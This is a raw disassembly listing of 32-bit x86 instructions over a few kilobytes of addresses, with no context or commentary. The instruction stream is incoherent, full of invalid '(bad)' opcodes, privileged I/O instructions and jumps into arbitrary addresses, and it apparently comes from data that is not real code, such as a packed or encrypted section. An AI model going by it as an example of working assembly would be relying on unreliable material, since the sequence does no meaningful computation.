  40daf7:	lods   al,BYTE PTR ds:[esi]
  40daf8:	add    eax,0x59152824
  40dafd:	mov    ds:0x7df4b46a,eax
  40db02:	jns    0x40db70
  40db04:	sub    BYTE PTR [eax-0x28],bh
  40db07:	outs   dx,DWORD PTR ds:[esi]
  40db08:	addr16 push cs
  40db0a:	dec    DWORD PTR [ebx+edi*4]
  40db0d:	repz imul dh
  40db10:	cdq    
  40db11:	cdq    
  40db12:	xchg   edx,eax
  40db13:	or     ch,BYTE PTR [ebx+0x769b6cc2]
  40db19:	(bad)  
  40db1a:	loopne 0x40db32
  40db1c:	mov    ebx,0xac0a493f
  40db21:	jecxz  0x40db6c
  40db23:	aam    0xff
  40db25:	pop    edi
  40db26:	pop    ss
  40db27:	nop
  40db28:	pop    ebp
  40db29:	aaa    
  40db2a:	dec    edx
  40db2b:	sti    
  40db2c:	sar    DWORD PTR [esi-0x7d],cl
  40db2f:	out    0x93,eax
  40db31:	inc    edi
  40db32:	mov    dh,0xce
  40db34:	in     eax,dx
  40db35:	in     eax,dx
  40db36:	mov    al,ds:0xf66685b9
  40db3b:	sar    ch,0x9a
  40db3e:	arpl   WORD PTR [edi],ax
  40db40:	push   0xe819f372
  40db45:	dec    edx
  40db46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db47:	sbb    ax,0x3406
  40db4b:	jp     0x40db7f
  40db4d:	les    esi,FWORD PTR [ecx-0x798ac797]
  40db53:	(bad)  
  40db54:	(bad)  
  40db55:	clc    
  40db56:	mov    dh,0x9e
  40db58:	mov    ch,0x7
  40db5a:	jns    0x40db6e
  40db5c:	in     al,0x9f
  40db5e:	aad    0xff
  40db60:	cmp    DWORD PTR [edi],0x1d78dfd
  40db66:	push   ebp
  40db67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db68:	add    al,0xf6
  40db6a:	mov    esp,ebx
  40db6c:	pop    ecx
  40db6d:	mov    es,WORD PTR [esi-0x7d]
  40db70:	pop    esi
  40db71:	retf   0xd72a
  40db74:	jmp    0x40dbd0
  40db76:	pushf  
  40db77:	fprem1 
  40db79:	dec    edi
  40db7a:	scas   eax,DWORD PTR es:[edi]
  40db7b:	sbb    ecx,eax
  40db7d:	rcl    BYTE PTR [edi+0x71f78082],0xcf
  40db84:	iret   
  40db85:	out    dx,eax
  40db86:	mov    edi,0xc9fca23f
  40db8b:	gs fs pushf 
  40db8e:	js     0x40dbd0
  40db90:	leave  
  40db91:	fcomp  DWORD PTR [esi]
  40db93:	sbb    ebp,DWORD PTR [ebp-0x13]
  40db96:	test   DWORD PTR ds:0x24714ea7,esi
  40db9c:	jne    0x40db4a
  40db9e:	xor    esp,DWORD PTR [edx-0x13]
  40dba1:	ss loop 0x40dbaf
  40dba4:	popf   
  40dba5:	shl    BYTE PTR [esi+ebx*2+0x719fbf4a],0x92
  40dbad:	call   0x27b87e41
  40dbb2:	ret    
  40dbb3:	or     dl,BYTE PTR [ecx+0x47]
  40dbb6:	jbe    0x40dbda
  40dbb8:	add    DWORD PTR [ebp-0x3d18e8f3],ebx
  40dbbe:	iret   
  40dbbf:	bnd jmp 0x40dbdf
  40dbc2:	in     al,dx
  40dbc3:	mov    gs,WORD PTR [ecx+0x29526c9f]
  40dbc9:	xchg   BYTE PTR [ebx+0x6638c2bd],dl
  40dbcf:	hlt    
  40dbd0:	test   eax,0xaa0c8b4d
  40dbd5:	(bad)  
  40dbd6:	frstor [edi]
  40dbd8:	pop    edi
  40dbd9:	inc    ebp
  40dbda:	js     0x40dbb3
  40dbdc:	jmp    0x40db9b
  40dbde:	inc    edx
  40dbdf:	rcl    DWORD PTR [ebp-0x71],cl
  40dbe2:	or     al,0x3a
  40dbe4:	mov    bh,0xc0
  40dbe6:	pusha  
  40dbe7:	call   0x50426caa
  40dbec:	or     BYTE PTR [ecx-0x5a0f3f46],ah
  40dbf2:	fwait
  40dbf3:	inc    ebx
  40dbf4:	cmp    ecx,eax
  40dbf6:	sbb    edi,edx
  40dbf8:	sbb    BYTE PTR [edx+eax*8-0x40d2816a],bl
  40dbff:	push   ebx
  40dc00:	xchg   esp,eax
  40dc01:	out    dx,al
  40dc02:	mov    ds:0xf2265228,eax
  40dc07:	jbe    0x40dbb2
  40dc09:	cmp    al,0x87
  40dc0b:	jge    0x40dbe4
  40dc0d:	mov    esp,eax
  40dc0f:	fnsave ss:[ebx-0x74]
  40dc13:	lock ds push cs
  40dc16:	lea    ecx,[edx]
  40dc18:	inc    esp
  40dc19:	rcr    BYTE PTR [ecx+0x64],0x1f
  40dc1d:	mov    edi,0xdade11d7
  40dc22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc23:	push   edx
  40dc24:	dec    edx
  40dc25:	aam    0xad
  40dc27:	pop    es
  40dc28:	jg     0x40dbc7
  40dc2a:	call   ebx
  40dc2c:	dec    esi
  40dc2d:	loopne 0x40dc89
  40dc2f:	inc    edi
  40dc30:	add    BYTE PTR [esi+0x56],dl
  40dc33:	mov    esp,0xe96b6570
  40dc38:	xchg   BYTE PTR [eax+0x79],bl
  40dc3b:	pop    esp
  40dc3c:	mov    ah,0xc4
  40dc3e:	in     al,dx
  40dc3f:	fcom   QWORD PTR [ecx+0x4c]
  40dc42:	test   eax,esi
  40dc44:	cmp    BYTE PTR [edi-0x19],bl
  40dc47:	cdq    
  40dc48:	cli    
  40dc49:	cmp    eax,0x4cafc0dd
  40dc4e:	mov    BYTE PTR [esi+0x6fdbcf7],bh
  40dc54:	ror    BYTE PTR [eax+0x65753d9e],0x60
  40dc5b:	inc    ebp
  40dc5c:	inc    ecx
  40dc5d:	adc    al,0x37
  40dc5f:	sbb    eax,0x72bd21eb
  40dc64:	xchg   DWORD PTR [ecx],edx
  40dc66:	cwde   
  40dc67:	pushf  
  40dc68:	xchg   esp,eax
  40dc69:	cli    
  40dc6a:	mov    BYTE PTR [edi+eax*8],dl
  40dc6d:	and    edx,DWORD PTR [ecx-0x4299bde0]
  40dc73:	sub    al,0x6f
  40dc75:	cmp    BYTE PTR [ebx-0x542e6e69],0x64
  40dc7c:	sbb    BYTE PTR [eax-0x76],0xf4
  40dc80:	mov    ch,BYTE PTR [esi+0x32bb85df]
  40dc86:	imul   edi,DWORD PTR [edi+0x212237d2],0xffffff87
  40dc8d:	imul   esi,DWORD PTR [ebp+0x4b51a65a],0xe7da4fde
  40dc97:	rcr    DWORD PTR [ebx+0x2e9502e],0x6e
  40dc9e:	jmp    0x9a81:0x47e169df
  40dca5:	fwait
  40dca6:	xor    al,0x71
  40dca8:	ds sbb al,0x16
  40dcab:	sub    al,0x67
  40dcad:	add    eax,0x3f6a7cdb
  40dcb2:	mov    DWORD PTR [edi-0xc],esp
  40dcb5:	jge    0x40dc7c
  40dcb7:	push   ds
  40dcb8:	inc    esi
  40dcb9:	out    dx,al
  40dcba:	lahf   
  40dcbb:	pop    edx
  40dcbc:	mov    ah,0x16
  40dcbe:	mov    cl,0x7
  40dcc0:	pop    ecx
  40dcc1:	pop    ebx
  40dcc2:	ins    DWORD PTR es:[edi],dx
  40dcc3:	or     esp,DWORD PTR [edx-0x23]
  40dcc6:	add    BYTE PTR [edi-0x6a],ch
  40dcc9:	fwait
  40dcca:	leave  
  40dccb:	test   al,0xff
  40dccd:	scas   al,BYTE PTR es:[edi]
  40dcce:	pop    ebp
  40dccf:	inc    esi
  40dcd0:	add    DWORD PTR [edx],eax
  40dcd2:	call   0xf826:0x27ead9e6
  40dcd9:	or     eax,0x761bdc9
  40dcde:	hlt    
  40dcdf:	sti    
  40dce0:	xor    bh,BYTE PTR [ecx+0x69a6fccc]
  40dce6:	dec    ecx
  40dce7:	test   al,0x31
  40dce9:	imul   ecx,edi,0x9decb020
  40dcef:	test   DWORD PTR [esi+0x1782d288],ebp
  40dcf5:	dec    edi
  40dcf6:	adc    eax,0x5ecf3a7a
  40dcfb:	sub    eax,0xc33a287c
  40dd00:	inc    eax
  40dd01:	popa   
  40dd02:	jp     0x40dcfe
  40dd04:	imul   esi,esi,0xffffff82
  40dd07:	test   BYTE PTR [ebx+0x3e],al
  40dd0a:	push   cs
  40dd0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd0c:	mov    edx,0x44002d04
  40dd11:	fstp   TBYTE PTR [eax-0x27bc0afe]
  40dd17:	dec    esp
  40dd18:	pop    esp
  40dd19:	test   DWORD PTR [esp+eax*4-0x59c7f585],ecx
  40dd20:	test   eax,0xfaccc37d
  40dd25:	xchg   edx,eax
  40dd26:	add    dl,0x14
  40dd29:	inc    ebp
  40dd2a:	xor    BYTE PTR [esi+0x76aa9af3],bl
  40dd30:	(bad)  
  40dd32:	stos   BYTE PTR es:[edi],al
  40dd33:	lods   al,BYTE PTR ds:[esi]
  40dd34:	test   eax,0x29fbcb6e
  40dd39:	in     eax,dx
  40dd3a:	xor    ch,dh
  40dd3c:	fisubr DWORD PTR [esi]
  40dd3e:	sahf   
  40dd3f:	faddp  st(1),st
  40dd41:	mov    al,0xc6
  40dd43:	jecxz  0x40dd8e
  40dd45:	pop    edi
  40dd46:	leave  
  40dd47:	push   esp
  40dd48:	enter  0x39d9,0xd5
  40dd4c:	cmp    eax,0x7ac667ed
  40dd51:	push   esp
  40dd52:	xchg   DWORD PTR [edx],eax
  40dd54:	adc    dh,dl
  40dd56:	call   0x6b65:0x84b4550d
  40dd5d:	push   ebp
  40dd5e:	pop    ds
  40dd5f:	jae    0x40dd80
  40dd61:	jne    0x40dd59
  40dd63:	xchg   dl,bl
  40dd65:	nop
  40dd66:	sub    cl,ch
  40dd68:	xchg   esp,eax
  40dd69:	or     edi,DWORD PTR [edx-0x76]
  40dd6c:	pop    eax
  40dd6d:	mov    ah,0xbe
  40dd6f:	imul   ebp,DWORD PTR [esi-0x12],0xfffffffa
  40dd73:	adc    bh,dh
  40dd75:	(bad)  
  40dd76:	mov    edx,0x541bbe7d
  40dd7b:	sbb    dl,ah
  40dd7d:	xor    eax,0x64e82822
  40dd82:	outs   dx,DWORD PTR ds:[esi]
  40dd83:	mov    WORD PTR [edx+0x1f],cs
  40dd86:	pop    edx
  40dd87:	clc    
  40dd88:	repnz neg BYTE PTR [ebp+ecx*1-0x49]
  40dd8d:	lods   eax,DWORD PTR ds:[esi]
  40dd8e:	or     al,0xce
  40dd90:	cmp    eax,0xc5b2b194
  40dd95:	mov    dl,BYTE PTR [esi]
  40dd97:	dec    ecx
  40dd98:	mov    dh,0x10
  40dd9a:	test   al,0x85
  40dd9c:	lahf   
  40dd9d:	adc    dh,BYTE PTR [ebp+0x74]
  40dda0:	mov    eax,ds:0x3be8ec2e
  40dda5:	fst    DWORD PTR [ecx+0xe]
  40dda8:	xchg   esi,eax
  40dda9:	stos   DWORD PTR es:[edi],eax
  40ddaa:	ja     0x40de0a
  40ddac:	sbb    eax,0xe1598b9a
  40ddb1:	ins    BYTE PTR es:[edi],dx
  40ddb2:	push   esp
  40ddb3:	mov    ebx,0x6ea1d097
  40ddb8:	push   ss
  40ddb9:	hlt    
  40ddba:	pop    es
  40ddbb:	mov    ebx,DWORD PTR [edx+ebp*1]
  40ddbe:	pop    esi
  40ddbf:	jae    0x40dd65
  40ddc1:	pop    eax
  40ddc2:	mov    esp,0xe396ee0d
  40ddc7:	cmp    eax,0xa5e44c0d
  40ddcc:	pop    es
  40ddcd:	(bad)  
  40ddce:	lock ss sbb ch,ch
  40ddd2:	mov    dl,0x94
  40ddd4:	push   ds
  40ddd5:	sbb    al,0x79
  40ddd7:	mov    ecx,0x35df1d83
  40dddc:	add    esp,DWORD PTR [ebx]
  40ddde:	std    
  40dddf:	and    al,0x10
  40dde1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dde2:	or     eax,0x79a43a55
  40dde7:	ins    BYTE PTR es:[edi],dx
  40dde8:	push   cs
  40dde9:	dec    esp
  40ddea:	inc    esp
  40ddeb:	mov    al,BYTE PTR [ebx]
  40dded:	repnz xor al,0xc9
  40ddf0:	popa   
  40ddf1:	mov    ds:0x60545963,al
  40ddf6:	cmp    eax,0x7feb73d8
  40ddfb:	dec    eax
  40ddfc:	xor    bl,dl
  40ddfe:	ins    DWORD PTR es:[edi],dx
  40ddff:	shl    BYTE PTR [ecx+ebx*1+0x2b],0xdc
  40de04:	cwde   
  40de05:	pop    ebp
  40de06:	call   0x9eab:0x58a5930e
  40de0d:	pop    ebx
  40de0e:	xor    eax,0xd9fc023c
  40de13:	cmc    
  40de14:	inc    edi
  40de15:	imul   esi,ebp,0x8ca27e16
  40de1b:	or     dh,BYTE PTR [esi+ebp*8-0x4a]
  40de1f:	jecxz  0x40ddae
  40de21:	mov    cl,0x8
  40de23:	cmp    cl,bh
  40de25:	dec    edx
  40de26:	pushf  
  40de27:	inc    esi
  40de28:	mov    dh,0xb7
  40de2a:	das    
  40de2b:	sahf   
  40de2c:	retf   0xcdd8
  40de2f:	xchg   edx,eax
  40de30:	int3   
  40de31:	and    DWORD PTR [esi-0x1a65a766],esi
  40de37:	enter  0xf0ac,0x29
  40de3b:	repnz pop ebp
  40de3d:	shl    BYTE PTR [ebx-0x38c61081],1
  40de43:	xor    eax,0x670ca3f
  40de48:	neg    al
  40de4a:	add    BYTE PTR [eax-0x2f],bh
  40de4d:	fstp   TBYTE PTR [eax+0x5276c480]
  40de53:	arpl   di,di
  40de55:	stc    
  40de56:	call   0xfb8d:0xda88ba18
  40de5d:	mov    DWORD PTR [eax+0x417f8165],esp
  40de63:	enter  0x8092,0xfd
  40de67:	or     BYTE PTR [ebx+0x31e384f7],al
  40de6d:	(bad)  
  40de6e:	rcr    BYTE PTR [ecx],cl
  40de70:	shl    BYTE PTR [edi+0x7f],0xac
  40de74:	pop    esp
  40de75:	inc    esp
  40de76:	mov    cl,0x5d
  40de78:	fs push ecx
  40de7a:	push   es
  40de7b:	push   0x9e59d6aa
  40de80:	mov    eax,ds:0xec559853
  40de85:	ins    BYTE PTR es:[edi],dx
  40de86:	iret   
  40de87:	sub    ebp,DWORD PTR [edx+0x73]
  40de8a:	dec    bl
  40de8c:	push   eax
  40de8d:	rol    DWORD PTR [edx+0x72],1
  40de90:	xchg   DWORD PTR [eax-0x44a611eb],esp
  40de96:	cli    
  40de97:	in     eax,dx
  40de98:	pop    ecx
  40de99:	stc    
  40de9a:	ret    
  40de9b:	call   0x706310f6
  40dea0:	icebp  
  40dea1:	fmul   DWORD PTR [di-0x77]
  40dea5:	adc    eax,0x67410f18
  40deaa:	xchg   esp,eax
  40deab:	push   0xffffffb9
  40dead:	add    ecx,DWORD PTR [ecx-0x75b0b9e5]
  40deb3:	dec    esp
  40deb4:	(bad)  
  40deb5:	in     eax,dx
  40deb6:	pop    esi
  40deb7:	aam    0xaa
  40deb9:	push   ebx
  40deba:	stos   DWORD PTR es:[edi],eax
  40debb:	or     ecx,DWORD PTR [esi+0x197c5703]
  40dec1:	imul   ebp,ecx,0x1d
  40dec4:	mov    ds:0x22b18cf7,al
  40dec9:	ret    
  40deca:	push   es
  40decb:	mov    bl,0x92
  40decd:	push   ds
  40dece:	mov    eax,ds:0xf091ef72
  40ded3:	push   ebp
  40ded4:	adc    al,0x81
  40ded6:	jge    0x40df1e
  40ded8:	fistp  QWORD PTR [edx]
  40deda:	jae    0x40de88
  40dedc:	mov    eax,ds:0xb44fc1a9
  40dee1:	lds    edx,FWORD PTR [eax+0x7d]
  40dee4:	pop    ss
  40dee5:	or     DWORD PTR [esi+0x32],edi
  40dee8:	push   eax
  40dee9:	repz sub DWORD PTR [esi+0x7d],ebx
  40deed:	js     0x40de7a
  40deef:	imul   ebx,DWORD PTR [edi],0x1b
  40def2:	mov    eax,?
  40def4:	(bad)  
  40def5:	pop    ebx
  40def6:	mov    ah,0xfe
  40def8:	pop    ss
  40def9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40defa:	mov    edi,DWORD PTR [eax]
  40defc:	sar    DWORD PTR [esi],0xe
  40deff:	mov    ah,0x4e
  40df01:	sub    ah,BYTE PTR [ebp-0x474d16b9]
  40df07:	dec    ecx
  40df09:	cmp    edx,DWORD PTR [ebx-0x134c0386]
  40df0f:	scas   eax,DWORD PTR es:[edi]
  40df10:	arpl   WORD PTR [edi],di
  40df12:	sbb    eax,0xc2b9091b
  40df17:	mov    eax,0x46ac84b
  40df1c:	adc    BYTE PTR [eax+0x52],dh
  40df1f:	sbb    DWORD PTR [ecx-0x72],esp
  40df22:	call   0xf27e:0xce25b46a
  40df29:	rol    BYTE PTR [edi-0x3c],1
  40df2c:	addr16 push esi
  40df2e:	mov    WORD PTR [esi-0x66],es
  40df31:	dec    eax
  40df32:	push   ss
  40df33:	dec    edi
  40df34:	(bad)  
  40df35:	loopne 0x40df45
  40df37:	push   ebp
  40df38:	push   esi
  40df39:	fwait
  40df3a:	ja     0x40df31
  40df3c:	sahf   
  40df3d:	fisttp WORD PTR [edi-0x2b]
  40df40:	into   
  40df41:	jmp    FWORD PTR [ebx+0x7f880c7d]
  40df47:	scas   eax,DWORD PTR es:[edi]
  40df48:	(bad)  
  40df4a:	dec    edi
  40df4b:	mov    ds:0xedc740b4,al
  40df50:	aas    
  40df51:	mov    cl,BYTE PTR [edx+0x20]
  40df54:	aad    0x16
  40df56:	pop    ebp
  40df57:	ret    0x1284
  40df5a:	jne    0x40deee
  40df5c:	adc    esi,DWORD PTR [ecx+0x1daf47df]
  40df62:	sub    esp,DWORD PTR [ebx-0x4f23f67f]
  40df68:	xor    ah,bh
  40df6a:	cmp    esp,0xffffffa1
  40df6d:	pand   mm2,mm1
  40df70:	loopne 0x40dff0
  40df72:	mov    dl,0x51
  40df74:	pushf  
  40df75:	mov    ebx,es
  40df77:	mov    edi,0xe7ed337a
  40df7c:	jecxz  0x40df29
  40df7e:	pop    es
  40df7f:	sbb    al,0x2c
  40df81:	and    eax,0xa1f569b
  40df86:	leave  
  40df87:	test   bl,0x3d
  40df8a:	and    BYTE PTR [esi-0x50a8f425],0x41
  40df91:	iret   
  40df92:	test   BYTE PTR [edi+0x10c0e42a],bl
  40df98:	hlt    
  40df99:	call   FWORD PTR [edi+0x11]
  40df9c:	sbb    dl,dl
  40df9e:	or     BYTE PTR [edx],ch
  40dfa0:	and    eax,0xe8adf76
  40dfa5:	mov    ah,0x4f
  40dfa7:	dec    edx
  40dfa8:	mov    al,ds:0x43478af8
  40dfad:	jno    0x40df67
  40dfaf:	push   DWORD PTR [esp+edx*8-0x14abf6bc]
  40dfb6:	or     DWORD PTR [edi+eiz*2],esp
  40dfb9:	fwait
  40dfba:	or     bl,bl
  40dfbc:	cdq    
  40dfbd:	sub    eax,0xab215255
  40dfc2:	jbe    0x40e03b
  40dfc4:	add    BYTE PTR [ecx+0x1f110e9b],0xc3
  40dfcb:	cwde   
  40dfcc:	jne    0x40df6a
  40dfce:	loopne 0x40df88
  40dfd0:	nop
  40dfd1:	fwait
  40dfd2:	mov    ch,BYTE PTR [eax+0x2aa03dc7]
  40dfd8:	mov    ch,BYTE PTR [edi-0x2a]
  40dfdb:	daa    
  40dfdc:	sub    eax,0xa740bb97
  40dfe1:	and    DWORD PTR [esi-0x18],ecx
  40dfe4:	aad    0xc0
  40dfe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfe7:	or     al,0x56
  40dfe9:	push   ebp
  40dfea:	and    BYTE PTR ds:0x748fd576,bl
  40dff0:	inc    ecx
  40dff1:	jns    0x40df80
  40dff3:	adc    BYTE PTR [edx],al
  40dff5:	ficomp DWORD PTR [edx]
  40dff7:	mov    ds:0x22ac8767,eax
  40dffc:	sub    bh,BYTE PTR [eax+ebx*1]
  40dfff:	popa   
  40e000:	mov    ds,edi
  40e002:	mov    ebx,ecx
  40e004:	jle    0x40dfec
  40e006:	jns    0x40dfb3
  40e008:	(bad)  
  40e009:	adc    ecx,DWORD PTR [edi]
  40e00b:	lods   al,BYTE PTR ds:[esi]
  40e00c:	int    0x47
  40e00e:	addr16 sub bl,cl
  40e011:	cwde   
  40e012:	sahf   
  40e013:	loop   0x40e061
  40e015:	shl    BYTE PTR [edi],cl
  40e017:	sub    eax,0x6db35f6f
  40e01c:	iret   
  40e01d:	and    DWORD PTR [edx+ebp*4-0x28],0xffffffea
  40e022:	sub    al,0x15
  40e024:	test   BYTE PTR [ebx-0x45f8970e],bh
  40e02a:	lahf   
  40e02b:	xchg   esp,eax
  40e02c:	and    eax,0x47d07b30
  40e031:	clc    
  40e032:	loope  0x40e041
  40e034:	adc    eax,0x4d49e6c4
  40e039:	mov    BYTE PTR [ebx+edx*2],al
  40e03c:	imul   BYTE PTR [ebx]
  40e03e:	fs xchg esi,eax
  40e040:	leave  
  40e041:	xchg   esp,eax
  40e042:	jp     0x40e0bd
  40e044:	pop    ebx
  40e045:	hlt    
  40e046:	fcmovu st,st(6)
  40e048:	cmp    DWORD PTR [ebx+eiz*1-0x34228d0d],edi
  40e04f:	les    esi,FWORD PTR [edi]
  40e051:	xor    ecx,DWORD PTR [esi]
  40e053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e054:	dec    edi
  40e055:	leave  
  40e056:	aad    0xe6
  40e058:	repz je 0x40e0bb
  40e05b:	inc    eax
  40e05c:	jmp    DWORD PTR [edi+0x167c95c8]
  40e062:	sti    
  40e063:	(bad)  
  40e064:	jle    0x40e05a
  40e066:	mov    ebx,0x2c7e4a86
  40e06b:	loopne 0x40e0a5
  40e06d:	data16 daa 
  40e06f:	daa    
  40e070:	rcl    ebp,1
  40e072:	pop    ss
  40e073:	in     eax,0xf6
  40e075:	into   
  40e076:	xor    BYTE PTR [edx],0x92
  40e079:	sub    DWORD PTR [edi],ebx
  40e07b:	add    eax,DWORD PTR [ecx-0x25]
  40e07e:	sbb    eax,DWORD PTR ds:0x9aa74c15
  40e084:	xor    al,0xe3
  40e086:	inc    esp
  40e087:	xor    eax,0xdf597042
  40e08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e08d:	mov    ebx,0xf0d9cbc6
  40e092:	iret   
  40e093:	jno    0x40e0b9
  40e095:	out    dx,al
  40e096:	jle    0x40e078
  40e098:	cmp    eax,0x6d3d544c
  40e09d:	pop    esi
  40e09e:	ror    BYTE PTR [ebx-0x29],1
  40e0a1:	add    BYTE PTR [edx],al
  40e0a3:	mov    edx,0x698cb16e
  40e0a8:	mov    dl,0xb5
  40e0aa:	call   0x465cd604
  40e0af:	jg     0x40e062
  40e0b1:	or     eax,0x7a3aa523
  40e0b6:	jns    0x40e0da
  40e0b8:	(bad)  
  40e0b9:	jmp    0xb2bddc07
  40e0be:	nop
  40e0bf:	jge    0x40e09f
  40e0c1:	(bad)  
  40e0c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0c4:	loope  0x40e0ab
  40e0c6:	rol    ch,cl
  40e0c8:	imul   edi,esi,0xbf9fcfa1
  40e0ce:	dec    ebx
  40e0cf:	cmp    eax,0x4de37ebf
  40e0d4:	lods   al,BYTE PTR ds:[esi]
  40e0d5:	pop    ss
  40e0d6:	mov    dl,ah
  40e0d8:	sub    ebp,DWORD PTR [ecx+0x1f7ecc5f]
  40e0de:	mov    dl,0xc5
  40e0e0:	or     al,0xac
  40e0e2:	pop    ecx
  40e0e3:	stos   BYTE PTR es:[edi],al
  40e0e4:	(bad)
  40e0e8:	dec    ebp
  40e0e9:	icebp  
  40e0ea:	in     eax,dx
  40e0eb:	push   cs
  40e0ec:	cmc    
  40e0ed:	push   ebx
  40e0ee:	dec    edi
  40e0ef:	jmp    0x4e69cf69
  40e0f4:	xchg   ebx,eax
  40e0f5:	(bad)
  40e0f8:	fwait
  40e0f9:	cmp    eax,0xf7310d97
  40e0fe:	cdq    
  40e0ff:	dec    ecx
  40e100:	rol    al,cl
  40e102:	out    0x83,eax
  40e104:	push   0xffffffb6
  40e106:	xchg   cx,ax
  40e108:	jb     0x40e133
  40e10a:	test   eax,0x56e465df
  40e10f:	pop    es
  40e110:	dec    edx
  40e111:	cmp    ebx,DWORD PTR [eax+ebx*2+0x65fee878]
  40e118:	inc    eax
  40e119:	mov    edx,0x8d41d1ca
  40e11e:	xchg   ebp,eax
  40e11f:	lock das 
  40e121:	imul   esi,DWORD PTR [ecx-0x1ac82822],0xa9c94d03
  40e12b:	lea    eax,[ecx+0x1a]
  40e12e:	test   DWORD PTR [eax-0x5e],esp
  40e131:	scas   eax,DWORD PTR es:[edi]
  40e132:	inc    eax
  40e133:	and    dh,BYTE PTR [esi-0x6d6d11a1]
  40e139:	and    ch,BYTE PTR [esp+eax*8+0x4209ae55]
  40e140:	rcl    BYTE PTR [ebx-0x1b55dcde],cl
  40e146:	lods   eax,DWORD PTR ds:[esi]
  40e147:	jno    0x40e0cb
  40e149:	cmp    DWORD PTR [edx+0x4b],ebp
  40e14c:	xchg   esp,eax
  40e14d:	mov    esi,0xb4647fbc
  40e152:	xor    BYTE PTR [ebp-0x7b0f5dde],dl
  40e158:	xor    eax,0x6002186c
  40e15e:	mov    DWORD PTR [ecx+0x46],edx
  40e161:	dec    ebp
  40e162:	mov    ebx,DWORD PTR [ebp+eiz*2+0x7]
  40e166:	scas   al,BYTE PTR es:[edi]
  40e167:	aaa    
  40e168:	add    eax,0x907e9bf8
  40e16d:	xlat   BYTE PTR gs:[ebx]
  40e16f:	or     eax,0xbb067338
  40e174:	ins    BYTE PTR es:[edi],dx
  40e175:	dec    esp
  40e176:	xchg   ecx,eax
  40e177:	xchg   ebx,eax
  40e178:	hlt    
  40e179:	stc    
  40e17a:	(bad)  
  40e17b:	call   0x4bd6:0x7e7aaea
  40e182:	or     cl,BYTE PTR [eax-0x1d]
  40e185:	push   0xffffffaa
  40e187:	stc    
  40e188:	out    dx,eax
  40e189:	int3   
  40e18a:	sub    DWORD PTR [esi],ebp
  40e18c:	ins    DWORD PTR es:[edi],dx
  40e18d:	and    ebp,edi
  40e18f:	ss push es
  40e191:	sbb    al,0x95
  40e193:	daa    
  40e194:	retf   
  40e195:	ins    DWORD PTR es:[edi],dx
  40e196:	sub    BYTE PTR [eax],bl
  40e198:	(bad)  
  40e199:	ins    BYTE PTR es:[edi],dx
  40e19a:	fnstcw WORD PTR [ebp-0x4d1adf73]
  40e1a0:	add    eax,0xad5e4d87
  40e1a5:	xchg   edx,eax
  40e1a6:	mov    dh,dl
  40e1a8:	lock mov edi,0x9a3f2d9e
  40e1ae:	jae    0x40e1c7
  40e1b0:	sbb    al,0x59
  40e1b2:	popa   
  40e1b3:	pop    DWORD PTR [esi+0x6299a7ae]
  40e1b9:	add    ecx,edx
  40e1bb:	mov    dh,0xed
  40e1bd:	cli    
  40e1be:	outs   dx,BYTE PTR ds:[esi]
  40e1bf:	rcr    DWORD PTR [edx-0x17],cl
  40e1c2:	adc    BYTE PTR [ebx-0x5d],ch
  40e1c5:	push   ecx
  40e1c6:	dec    esi
  40e1c7:	dec    esi
  40e1c8:	mov    fs,WORD PTR [eax]
  40e1ca:	inc    ecx
  40e1cb:	addr16 and al,0xf6
  40e1ce:	leave  
  40e1cf:	in     eax,0x72
  40e1d1:	xor    ch,BYTE PTR [ecx]
  40e1d3:	fsub   DWORD PTR [eax]
  40e1d5:	push   edi
  40e1d6:	das    
  40e1d7:	mov    eax,0xe7a4104c
  40e1dc:	dec    esp
  40e1dd:	rcl    DWORD PTR [edx],1
  40e1df:	jle    0x40e18a
  40e1e1:	jb     0x40e195
  40e1e3:	aaa    
  40e1e4:	or     eax,0xe191bae6
  40e1e9:	jnp    0x40e1e8
  40e1eb:	push   0xbddbc53c
  40e1f0:	fcom   QWORD PTR [edx+0xc03cd84]
  40e1f6:	cmp    ah,BYTE PTR [edx-0x41]
  40e1f9:	jo     0x40e262
  40e1fb:	in     al,0x33
  40e1fd:	test   BYTE PTR [edx-0x6d],ah
  40e200:	jp     0x40e238
  40e202:	ja     0x40e280
  40e204:	pop    eax
  40e205:	shl    BYTE PTR [ecx-0x72],1
  40e208:	inc    ebx
  40e209:	sti    
  40e20a:	xor    al,0x98
  40e20c:	bound  esp,QWORD PTR [ebp+0x7c4e6fb9]
  40e212:	xor    eax,0x3b769de0
  40e217:	sub    BYTE PTR [esi-0x73],dh
  40e21a:	fiadd  WORD PTR [eax]
  40e21c:	xchg   ebp,eax
  40e21d:	mov    BYTE PTR [ecx+eax*2+0x63],bl
  40e221:	gs jo  0x40e1d1
  40e224:	sbb    edi,edx
  40e226:	jmp    0x40e27e
  40e228:	mov    ebx,0xfe8a6e21
  40e22d:	fwait
  40e22e:	es mov al,0x1d
  40e231:	loope  0x40e20a
  40e233:	popa   
  40e234:	or     al,BYTE PTR ds:0xe08f4b0c
  40e23a:	ins    DWORD PTR es:[edi],dx
  40e23b:	cmp    BYTE PTR [ebp-0x2d114c0],al
  40e241:	mov    esi,0x3a686b89
  40e246:	sub    al,BYTE PTR [edi+ebp*2-0x2]
  40e24a:	test   ah,dl
  40e24c:	mov    ecx,0xd6e038bd
  40e251:	or     ah,dl
  40e253:	in     eax,dx
  40e254:	retf   
  40e255:	shl    esp,cl
  40e257:	mov    dh,0x8c
  40e259:	jle    0x40e220
  40e25b:	sub    BYTE PTR [esi-0x4f],bl
  40e25e:	jg     0x40e2cb
  40e260:	sbb    DWORD PTR [edi],eax
  40e262:	xor    BYTE PTR ds:[edi],0xb8
  40e266:	push   edi
  40e267:	cld    
  40e268:	mov    edi,0xe029559e
  40e26d:	mov    edx,0x3fec3245
  40e272:	(bad)  
  40e273:	(bad)  
  40e274:	xor    edi,edx
  40e276:	neg    BYTE PTR [eax+0x677825a6]
  40e27c:	(bad)  
  40e27d:	pop    edx
  40e27e:	popa   
  40e27f:	call   0xc9abd198
  40e284:	das    
  40e285:	pop    ds
  40e286:	sbb    bl,dh
